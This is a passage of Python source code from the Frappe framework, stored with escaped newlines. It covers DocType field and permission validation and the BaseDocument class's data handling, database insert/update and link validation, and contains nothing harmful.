option.strip()\n\t\t\t\tif i==0 or _option:\n\t\t\t\t\toptions_list.append(_option)\n\t\t\tfield.options = '\\n'.join(options_list)\n\n\tdef scrub_fetch_from(field):\n\t\tif hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):\n\t\t\tfield.fetch_from = field.fetch_from.strip('\\n').strip()\n\n\tfields = meta.get(\"fields\")\n\tfieldname_list = [d.fieldname for d in fields]\n\n\tnot_allowed_in_list_view = list(copy.copy(no_value_fields))\n\tnot_allowed_in_list_view.append(\"Attach Image\")\n\tif meta.istable:\n\t\tnot_allowed_in_list_view.remove('Button')\n\n\tfor d in fields:\n\t\tif not d.permlevel: d.permlevel = 0\n\t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n\t\tif not d.fieldname:\n\t\t\td.fieldname = d.fieldname.lower()\n\n\t\tcheck_illegal_characters(d.fieldname)\n\t\tcheck_unique_fieldname(meta.get(\"name\"), d.fieldname)\n\t\tcheck_fieldname_length(d.fieldname)\n\t\tcheck_illegal_mandatory(meta.get(\"name\"), d)\n\t\tcheck_link_table_options(meta.get(\"name\"), d)\n\t\tcheck_dynamic_link_options(d)\n\t\tcheck_hidden_and_mandatory(meta.get(\"name\"), d)\n\t\tcheck_in_list_view(d)\n\t\tcheck_in_global_search(d)\n\t\tcheck_illegal_default(d)\n\t\tcheck_unique_and_text(meta.get(\"name\"), d)\n\t\tcheck_illegal_depends_on_conditions(d)\n\t\tscrub_options_in_select(d)\n\t\tscrub_fetch_from(d)\n\n\tcheck_fold(fields)\n\tcheck_search_fields(meta, fields)\n\tcheck_title_field(meta)\n\tcheck_timeline_field(meta)\n\tcheck_is_published_field(meta)\n\tcheck_sort_field(meta)\n\tcheck_image_field(meta)\n\ndef validate_permissions_for_doctype(doctype, for_remove=False):\n\t\"\"\"Validates if permissions are set correctly.\"\"\"\n\tdoctype = frappe.get_doc(\"DocType\", doctype)\n\tvalidate_permissions(doctype, for_remove)\n\n\t# save permissions\n\tfor perm in doctype.get(\"permissions\"):\n\t\tperm.db_update()\n\n\tclear_permissions_cache(doctype.name)\n\ndef clear_permissions_cache(doctype):\n\tfrappe.clear_cache(doctype=doctype)\n\tdelete_notification_count_for(doctype)\n\tfor user in frappe.db.sql_list(\"\"\"select\n\t\t\tdistinct `tabHas Role`.parent\n\t\tfrom\n\t\t\t`tabHas Role`,\n\t\ttabDocPerm\n\t\t\twhere tabDocPerm.parent = %s\n\t\t\tand tabDocPerm.role = `tabHas Role`.role\"\"\", doctype):\n\t\tfrappe.clear_cache(user=user)\n\ndef validate_permissions(doctype, for_remove=False):\n\tpermissions = doctype.get(\"permissions\")\n\tif not permissions:\n\t\tfrappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')\n\tissingle = issubmittable = isimportable = False\n\tif doctype:\n\t\tissingle = cint(doctype.issingle)\n\t\tissubmittable = cint(doctype.is_submittable)\n\t\tisimportable = cint(doctype.allow_import)\n\n\tdef get_txt(d):\n\t\treturn _(\"For {0} at level {1} in {2} in row {3}\").format(d.role, d.permlevel, d.parent, d.idx)\n\n\tdef check_atleast_one_set(d):\n\t\tif not d.read and not d.write and not d.submit and not d.cancel and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: No basic permissions set\").format(get_txt(d)))\n\n\tdef check_double(d):\n\t\thas_similar = False\n\t\tsimilar_because_of = \"\"\n\t\tfor p in permissions:\n\t\t\tif p.role==d.role and p.permlevel==d.permlevel and p!=d:\n\t\t\t\tif p.if_owner==d.if_owner:\n\t\t\t\t\tsimilar_because_of = _(\"If Owner\")\n\t\t\t\t\thas_similar = True\n\t\t\t\t\tbreak\n\n\t\tif has_similar:\n\t\t\tfrappe.throw(_(\"{0}: Only one rule allowed with the same Role, Level and {1}\")\\\n\t\t\t\t.format(get_txt(d),\tsimilar_because_of))\n\n\tdef check_level_zero_is_set(d):\n\t\tif cint(d.permlevel) > 0 and d.role != 'All':\n\t\t\thas_zero_perm = False\n\t\t\tfor p in permissions:\n\t\t\t\tif p.role==d.role and (p.permlevel or 0)==0 and p!=d:\n\t\t\t\t\thas_zero_perm = True\n\t\t\t\t\tbreak\n\n\t\t\tif not has_zero_perm:\n\t\t\t\tfrappe.throw(_(\"{0}: Permission at level 0 must be set before higher levels are set\").format(get_txt(d)))\n\n\t\t\tfor invalid in (\"create\", \"submit\", \"cancel\", \"amend\"):\n\t\t\t\tif d.get(invalid): d.set(invalid, 0)\n\n\tdef check_permission_dependency(d):\n\t\tif d.cancel and not d.submit:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Cancel without Submit\").format(get_txt(d)))\n\n\t\tif (d.submit or d.cancel or d.amend) and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Submit, Cancel, Amend without Write\").format(get_txt(d)))\n\t\tif d.amend and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Amend without Cancel\").format(get_txt(d)))\n\t\tif d.get(\"import\") and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Import without Create\").format(get_txt(d)))\n\n\tdef remove_rights_for_single(d):\n\t\tif not issingle:\n\t\t\treturn\n\n\t\tif d.report:\n\t\t\tfrappe.msgprint(_(\"Report cannot be set for Single types\"))\n\t\t\td.report = 0\n\t\t\td.set(\"import\", 0)\n\t\t\td.set(\"export\", 0)\n\n\t\tfor ptype, label in [[\"set_user_permissions\", _(\"Set User Permissions\")]]:\n\t\t\tif d.get(ptype):\n\t\t\t\td.set(ptype, 0)\n\t\t\t\tfrappe.msgprint(_(\"{0} cannot be set for Single types\").format(label))\n\n\tdef check_if_submittable(d):\n\t\tif d.submit and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Submit if not Submittable\").format(get_txt(d)))\n\t\telif d.amend and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Amend if not Submittable\").format(get_txt(d)))\n\n\tdef check_if_importable(d):\n\t\tif d.get(\"import\") and not isimportable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set import as {1} is not importable\").format(get_txt(d), doctype))\n\n\tfor d in permissions:\n\t\tif not d.permlevel:\n\t\t\td.permlevel=0\n\t\tcheck_atleast_one_set(d)\n\t\tif not for_remove:\n\t\t\tcheck_double(d)\n\t\t\tcheck_permission_dependency(d)\n\t\t\tcheck_if_submittable(d)\n\t\t\tcheck_if_importable(d)\n\t\tcheck_level_zero_is_set(d)\n\t\tremove_rights_for_single(d)\n\ndef make_module_and_roles(doc, perm_fieldname=\"permissions\"):\n\t\"\"\"Make `Module Def` and `Role` records if already not made. Called while installing.\"\"\"\n\ttry:\n\t\tif hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \\\n\t\t\tnot frappe.db.exists('Domain', doc.restrict_to_domain):\n\t\t\tfrappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()\n\n\t\tif not frappe.db.exists(\"Module Def\", doc.module):\n\t\t\tm = frappe.get_doc({\"doctype\": \"Module Def\", \"module_name\": doc.module})\n\t\t\tm.app_name = frappe.local.module_app[frappe.scrub(doc.module)]\n\t\t\tm.flags.ignore_mandatory = m.flags.ignore_permissions = True\n\t\t\tm.insert()\n\n\t\tdefault_roles = [\"Administrator\", \"Guest\", \"All\"]\n\t\troles = [p.role for p in doc.get(\"permissions\") or []] + default_roles\n\n\t\tfor role in list(set(roles)):\n\t\t\tif not frappe.db.exists(\"Role\", role):\n\t\t\t\tr = frappe.get_doc(dict(doctype= \"Role\", role_name=role, desk_access=1))\n\t\t\t\tr.flags.ignore_mandatory = r.flags.ignore_permissions = True\n\t\t\t\tr.insert()\n\texcept frappe.DoesNotExistError as e:\n\t\tpass\n\texcept frappe.SQLError as e:\n\t\tif e.args[0]==1146:\n\t\t\tpass\n\t\telse:\n\t\t\traise\n\ndef init_list(doctype):\n\t\"\"\"Make boilerplate list views.\"\"\"\n\tdoc = frappe.get_meta(doctype)\n\tmake_boilerplate(\"controller_list.js\", doc)\n\tmake_boilerplate(\"controller_list.html\", doc)\n\ndef check_if_fieldname_conflicts_with_methods(doctype, fieldname):\n\tdoc = frappe.get_doc({\"doctype\": doctype})\n\tmethod_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]\n\n\tif fieldname in method_list:\n\t\tfrappe.throw(_(\"Fieldname {0} conflicting with meta object\").format(fieldname))\n\ndef clear_linked_doctype_cache():\n\tfrappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')\n/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and 